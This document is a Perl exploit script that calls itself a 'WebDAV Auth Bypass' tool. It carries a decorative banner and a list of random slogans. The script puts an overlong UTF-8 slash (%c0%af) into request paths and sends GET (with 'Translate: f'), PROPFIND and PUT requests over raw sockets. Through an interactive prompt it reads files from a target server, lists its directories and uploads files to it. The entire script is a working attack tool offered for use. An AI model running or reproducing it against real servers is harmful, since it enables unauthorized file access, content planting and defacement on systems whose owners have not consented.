#!/usr/bin/perl -W

use IO::Socket ;
use HTTP::Request;
use LWP::UserAgent;
use Term::ANSIColor;
my @c = ("\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[0;32m", "\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[0;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;34m");
my @ESLOGAN=("A day without laughter is a day wasted", "Virgin!! life will fuck us all!", "Life is really simple, but we insist on making it complicated.", "We do not remember days, we remember moments.", "Be the Change That You Wish To See In The World", "! Keep Calm And love me !", "You look better today !", "Float like a butterfly, sting like a bee.", "If it were not for hopes, the heart would break.","Say 1.2.3 viva l'Algerie");

system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
system('clear');
print "
███╗   ███╗ █████╗ ███╗   ██╗██╗███████╗███████╗ ██████╗
████╗ ████║██╔══██╗████╗  ██║██║██╔════╝██╔════╝██╔═══██╗
██╔████╔██║███████║██╔██╗ ██║██║███████╗███████╗██║   ██║
██║╚██╔╝██║██╔══██║██║╚██╗██║██║╚════██║╚════██║██║   ██║
██║ ╚═╝ ██║██║  ██║██║ ╚████║██║███████║███████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝ ╚═════╝ 
▀▀█▀▀ █▀▀█ █▀▀█ █   █▀▀ ~ WebDAV Auth Bypass By Ⓜ Ⓐ Ⓝ Ⓘ Ⓢ Ⓢ Ⓞ  ☪ ~
  █   █  █ █  █ █   ▀▀█ 
  ▀   ▀▀▀▀ ▀▀▀▀ ▀▀▀ ▀▀▀ 
                 
$c[2] #$ESLOGAN[rand @ESLOGAN] $c[3]                                               
                                               ";


print "\n";

 

 
my ( $host, $path ) = @ARGV ;
my $port = 80 ; # webserver port
 
&usage unless $ARGV[1] ;
 
$host =~ s/http:\/\/// if($host =~ /^http:\/\//i) ;
$path =~ s/\/// if(substr($path, 0,1) eq '/');
 
sub _file {
    $file = shift ;
    open(FILE, $file) || die "[-] ERROR: ".$!,"\n" ;
    while( <FILE> ){
        $cont .= $_ ;
    }
    close(FILE) ;
    return $cont ;
}
 
 
print "write 'help' for get help list\n\n";
 
 
while( 1 ) {
 
    my $sock = IO::Socket::INET->new (PeerAddr => $host, 
                    PeerPort => $port,
                    Proto    => 'tcp') || die "\n[-] ERROR: ".$!,"\n" ;
    print "XDAV~> ";
    chomp( my $option = <STDIN> ) ;
    last if $option eq 'ext' ;
 
    if($option eq 'cat') {
        $path =~ s/\//%c0%af\// ; 
        print $sock "GET /".$path." HTTP/1.1\r\n" ; 
        print $sock "Translate: f\r\n" ;
        print $sock "Host: ".$host."\r\n" ;
        print $sock "Connection: close\r\n\r\n" ;
 
        while(<$sock>){
            print $_ ;
        }
        close($sock) ;
    }
 
 
    elsif($option eq 'dir') {
        $path =~ s/\//%c0%af\// ;
        print $sock "PROPFIND  /".$path." HTTP/1.1\r\n" ;
        print $sock "Host: ".$host."\r\n" ;
        print $sock "Connection:close\r\n" ;
        print $sock 'Content-Type: text/html; charset="utf-8"'."\r\n" ;
        print $sock "Content-Length: 0\r\n\r\n" ;
        print $sock  '<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:prop xmlns:R="http://www.foo.bar/boxschema/"><R:bigbox/><R:author/><R:DingALing/><R:Random/></D:prop></D:propfind>' ;
 
        while(<$sock>){
            print $_ ;
        }
        close($sock) ;
    }
 
 
    elsif($option eq 'put') {
        $path =~ s/\//%c0%af\// ;
        print "[*] Insert a local file (ex: /root/index.html): " ;
        chomp( $local = <STDIN> ) ;
        $file_l = _file( $local ) ;
        print $sock "PUT /".$path."xdav.html HTTP/1.1\r\n" ;
        print $sock "Host: ".$host."\r\n" ;
        print $sock 'Content-Type: text/html; charset="utf-8"'."\r\n" ;
        print $sock "Connection:close\r\n" ;
        print $sock "Content-Length: ".length($file_l)."\r\n\r\n" ;
        print $sock $file_l,"\r\n" ;
 
        while(<$sock>){
            print $_ ;
        }
        close($sock) ;
    }
 
    elsif($option eq 'help') {
        print "\n\t\t - OPTIONS -\n\n\n" ;
        print "\thelp\t\tGive help list\n" ;
        print "\tcat\t\tGet file content\n" ;
        print "\tdir\t\tGet directory contents\n" ;
        print "\tput\t\tUpload file\n" ;
        print "\text\t\tExit exploit\n\n" ;
    }
     
}
 
sub usage {
    print << 'EOH' ;
Usage:
   xdav <Host> <Path>
 
Example:

   xdav localhost dir/
   xdav localhost dir/file
 
EOH
 
    exit;
}
     
     
 
 
__END__
